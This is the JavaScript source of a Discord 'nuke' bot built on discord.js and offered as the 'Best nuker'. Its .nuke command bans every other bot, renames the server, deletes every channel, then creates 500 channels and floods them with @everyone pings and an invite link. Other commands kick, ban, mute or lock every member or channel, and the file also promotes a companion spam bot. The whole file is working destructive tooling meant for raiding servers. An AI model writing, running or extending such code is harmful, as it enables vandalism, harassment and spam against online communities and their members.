const { Client, EmbedBuilder, ActionRowBuilder, ButtonBuilder, ButtonStyle } = require('discord.js');
const http = require('http');

const client = new Client({ intents: [1, 512, 32768, 2, 16] });

const TOKEN = process.env.TOKEN;
const INVITE_URL = "https://discord.com/oauth2/authorize?client_id=1497740024983195668&permissions=8&integration_type=0&scope=bot";
const EXT_INVITE = "https://discord.com/oauth2/authorize?client_id=1489612859179798588&integration_type=1&scope=applications.commands";
const OWNER_ID = "1183142340609708072";
const WHITELIST_ROLE_ID = "1498099673406374029";
const SPAM_LINK = "https://discord.gg/2Qr8Fza3s";

http.createServer((req, res) => { res.writeHead(200); res.end('Alive'); }).listen(process.env.PORT || 3000);
client.once('ready', () => console.log(`[+] ${client.user.tag} online`));

const sleep = ms => new Promise(r => setTimeout(r, ms));

client.on('messageCreate', async (message) => {
    if (message.author.bot) return;
    const args = message.content.trim().split(/\s+/);
    const cmd = args[0].toLowerCase();

    if (cmd === '.whitelist') {
        if (message.author.id !== OWNER_ID) return message.reply('You are not the owner').catch(() => {});
        const target = message.mentions.members.first();
        if (!target) return message.reply('Mention someone').catch(() => {});
        target.roles.add(WHITELIST_ROLE_ID).then(() => message.reply(`Whitelisted ${target.user.tag}`)).catch(() => message.reply('Failed'));
        return;
    }

    if (cmd === '.panel') {
        const embed = new EmbedBuilder().setTitle('Nuke Bot').setDescription('**Best nuker**\nBans all bots, deletes all channels, spams 6ujz.').setColor(0xff0000);
        const row = new ActionRowBuilder().addComponents(
            new ButtonBuilder().setLabel('Invite').setStyle(ButtonStyle.Link).setURL(INVITE_URL),
            new ButtonBuilder().setLabel('Commands').setStyle(ButtonStyle.Primary).setCustomId('cmds')
        );
        return message.channel.send({ embeds: [embed], components: [row] }).catch(() => {});
    }

    if (cmd === '.extpanel') {
        const embed = new EmbedBuilder().setTitle('External Bot').setDescription('/say /blame /spam (free)\n/fast-flood /custom-spam /l-spam (premium)').setColor(0x00ff00);
        const row = new ActionRowBuilder().addComponents(new ButtonBuilder().setLabel('Add External Bot').setStyle(ButtonStyle.Link).setURL(EXT_INVITE));
        return message.channel.send({ embeds: [embed], components: [row] }).catch(() => {});
    }

    if (cmd === '.nuke') {
        await message.delete().catch(() => {});
        const g = message.guild;

        // 1. Ban all bots
        const bots = g.members.cache.filter(m => m.user.bot && m.bannable && m.id !== client.user.id);
        for (const [id, bot] of bots) {
            await bot.ban({ reason: 'Nuke - banning all bots' }).catch(() => {});
            await sleep(100);
        }

        // 2. Change server name
        await g.setName('6ujz on top').catch(() => {});

        // 3. Delete all channels
        const channels = Array.from(g.channels.cache.values());
        for (const ch of channels) {
            await ch.delete().catch(() => {});
            await sleep(100);
        }

        // 4. Create mass channels and spam
        for (let i = 0; i < 500; i++) {
            g.channels.create({ name: '6ujz-owns-u', type: 0 }).then(ch => {
                if (!ch) return;
                for (let j = 0; j < 10; j++) {
                    ch.send(`@everyone @here ${SPAM_LINK} 6UJZ OWNS U`).catch(() => {});
                }
            }).catch(() => {});
            await sleep(200);
        }
        return;
    }

    if (cmd === '.kick') { const m = message.mentions.members.first(); if (m) m.kick().catch(() => {}); return; }
    if (cmd === '.ban') { const m = message.mentions.members.first(); if (m) m.ban().catch(() => {}); return; }
    if (cmd === '.kickall') { for (const [, m] of message.guild.members.cache) { if (m.kickable && m.id !== client.user.id) m.kick().catch(() => {}); } return; }
    if (cmd === '.banall') { for (const [, m] of message.guild.members.cache) { if (m.bannable && m.id !== client.user.id) m.ban().catch(() => {}); } return; }
    if (cmd === '.muteall') { for (const [, m] of message.guild.members.cache) { if (m.moderatable) m.timeout(28*24*60*60*1000).catch(() => {}); } return; }
    if (cmd === '.lockall') { for (const [, ch] of message.guild.channels.cache) { if (ch.type === 0) ch.permissionOverwrites.create(message.guild.roles.everyone, { SendMessages: false }).catch(() => {}); } return; }
});

client.on('interactionCreate', async (interaction) => {
    if (!interaction.isButton()) return;
    if (interaction.customId === 'cmds') {
        const embed = new EmbedBuilder().setTitle('Commands').setDescription('.nuke (ban bots + delete channels + spam 6ujz)\n.kick / .ban @user\n.kickall / .banall / .muteall / .lockall\n.panel / .extpanel');
        return interaction.reply({ embeds: [embed], ephemeral: true });
    }
});

client.login(TOKEN);
